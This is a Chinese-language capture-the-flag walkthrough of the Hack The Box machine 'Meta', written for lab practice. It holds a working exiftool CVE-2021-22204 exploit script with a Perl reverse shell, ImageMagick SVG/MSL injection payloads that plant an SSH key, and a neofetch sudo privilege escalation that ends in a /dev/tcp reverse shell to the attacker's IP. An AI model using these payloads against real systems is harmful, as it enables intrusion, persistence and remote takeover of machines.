[https://app.hackthebox.com/machines/429](https://app.hackthebox.com/machines/429)

nmap扫描结果

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203272349104.png)

将`10.10.11.140    artcorp.htb`添加到`/etc/hosts`中

---

```bash
$ ./gobuster vhost -u http://artcorp.htb/ -w /mnt/hgfs/Exploits/subdomains-top1million-110000.txt -t 100
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://artcorp.htb/
[+] Method:       GET
[+] Threads:      100
[+] Wordlist:     /mnt/hgfs/Exploits/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/03/27 23:53:31 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev01.artcorp.htb (Status: 200) [Size: 247]
                                                  
===============================================================
2022/03/27 23:55:04 Finished
===============================================================
```

将`10.10.11.140    dev01.artcorp.htb`添加到`/etc/hosts`中

---

有个文件上传点[http://dev01.artcorp.htb/metaview/index.php](http://dev01.artcorp.htb/metaview/index.php)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203280004795.png)

上传png文件后,返回文件的ext信息

```
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 254
Image Height                    : 255
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Significant Bits                : 8 8 8 8
Software                        : gnome-screenshot
```

推测这里可能存在`imagemagick`的漏洞[ImageMagick 命令执行分析](https://wooyun.js.org/drops/CVE-2016-3714%20-%20ImageMagick%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90.html)

但是试了一下貌似不对...

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203280029598.png)

在生成imagemagick的利用payload时,发现exiftool的输出结果与网页回显的结果类似,推测其为exiftool

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203280032420.png)

[CVE-2021-22204-exiftool](https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/)

[convisolabs/CVE-2021-22204-exiftool](https://github.com/convisolabs/CVE-2021-22204-exiftool)

---

```python
#!/bin/env python3

import base64
import subprocess

ip = '10.10.16.22'
port = '9090'

payload = b"(metadata \"\c${use MIME::Base64;eval(decode_base64('"


payload = payload + base64.b64encode( f"use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in({port},inet_aton('{ip}')))){{open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');}};".encode() )

payload = payload + b"'))};\")"


payload_file = open('payload', 'w')
payload_file.write(payload.decode('utf-8'))
payload_file.close()


subprocess.run(['bzz', 'payload', 'payload.bzz'])
subprocess.run(['djvumake', 'exploit.djvu', "INFO=1,1", 'BGjp=/dev/null', 'ANTz=payload.bzz'])
subprocess.run(['exiftool', '-config', 'configfile', '-HasselbladExif<=exploit.djvu', 'image.jpg']) 
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203280039450.png)

```
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ cat /etc/passwd | grep sh
cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
thomas:x:1000:1000:thomas,,,:/home/thomas:/bin/bash
```

`linpeas.sh`没有得到当前权限下的有效信息,传个`pspy64`监控下进程

```
2022/03/27 12:53:06 CMD: UID=0    PID=1      | /sbin/init 
2022/03/27 12:54:01 CMD: UID=0    PID=17947  | /usr/sbin/CRON -f 
2022/03/27 12:54:01 CMD: UID=0    PID=17946  | /usr/sbin/cron -f 
2022/03/27 12:54:01 CMD: UID=0    PID=17945  | /usr/sbin/CRON -f 
2022/03/27 12:54:01 CMD: UID=0    PID=17944  | /usr/sbin/CRON -f 
2022/03/27 12:54:01 CMD: UID=0    PID=17943  | /usr/sbin/cron -f 
2022/03/27 12:54:01 CMD: UID=0    PID=17949  | /usr/sbin/CRON -f 
2022/03/27 12:54:01 CMD: UID=0    PID=17948  | /usr/sbin/CRON -f 
2022/03/27 12:54:01 CMD: UID=1000 PID=17952  | /usr/local/bin/mogrify -format png *.* 
2022/03/27 12:54:01 CMD: UID=1000 PID=17951  | /bin/bash /usr/local/bin/convert_images.sh 
2022/03/27 12:54:01 CMD: UID=1000 PID=17950  | /bin/sh -c /usr/local/bin/convert_images.sh 
2022/03/27 12:54:01 CMD: UID=0    PID=17957  | rm /tmp/systemd-private-44572498d12c46d58d79d44419a7b8db-apache2.service-288m5B /tmp/systemd-private-44572498d12c46d58d79d44419a7b8db-systemd-timesyncd.service-uK7uJf /tmp/vmware-root_473-2092907038 
2022/03/27 12:54:01 CMD: UID=0    PID=17956  | cp -rp /root/conf/config_neofetch.conf /home/thomas/.config/neofetch/config.conf 
2022/03/27 12:54:01 CMD: UID=0    PID=17955  | /bin/sh -c rm /var/www/dev01.artcorp.htb/convert_images/* 
2022/03/27 12:54:01 CMD: UID=0    PID=17954  | /bin/sh -c rm /var/www/dev01.artcorp.htb/convert_images/* 
2022/03/27 12:54:01 CMD: UID=0    PID=17953  | /bin/sh -c rm /tmp/* 
2022/03/27 12:54:01 CMD: UID=0    PID=17959  | /bin/sh -c rm /var/www/dev01.artcorp.htb/metaview/uploads/* 
2022/03/27 12:54:01 CMD: UID=1000 PID=17958  | pkill mogrify 
```

`/usr/local/bin/convert_images.sh`

```bash
#!/bin/bash
cd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format png *.* 2>/dev/null
pkill mogrify
```

[https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html](https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html)

```
<image authenticate='ff" `echo $(id)> /dev/shm/out`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```

`cp poc.svg /var/www/dev01.artcorp.htb/convert_images/`即可

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281348546.png)

```
<image authenticate='ff" `mkdir -p /home/thomas/.ssh;echo ssh-rsa AAAABxxx97s= kali@kali > /home/thomas/.ssh/authorized_keys;echo $(whoami)> /dev/shm/out`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281352446.png)

---

```
[+] [CVE-2019-13272] PTRACE_TRACEME

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1903
   Exposure: highly probable
   Tags: ubuntu=16.04{kernel:4.15.0-*},ubuntu=18.04{kernel:4.15.0-*},debian=9{kernel:4.9.0-*},[ debian=10{kernel:4.19.0-*} ],fedora=30{kernel:5.0.9-*}
   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47133.zip
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c
   Comments: Requires an active PolKit agent.
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281409680.png)

```
thomas@meta:~$ sudo -l
Matching Defaults entries for thomas on meta:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=XDG_CONFIG_HOME

User thomas may run the following commands on meta:
    (root) NOPASSWD: /usr/bin/neofetch \"\"
```

[https://gtfobins.github.io/gtfobins/neofetch/](https://gtfobins.github.io/gtfobins/neofetch/)

但不能直接利用

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281415726.png)

[https://github.com/dylanaraps/neofetch/wiki/Customizing-Info](https://github.com/dylanaraps/neofetch/wiki/Customizing-Info)

修改`.config/neofetch/config.conf`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281421051.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281422124.png)

`prin "$(id)"`然后`export XDG_CONFIG_HOME=/home/thomas/.config/`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281427096.png)

`prin "$(sh -i >& /dev/tcp/10.10.16.22/9001 0>&1)"`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281456095.png)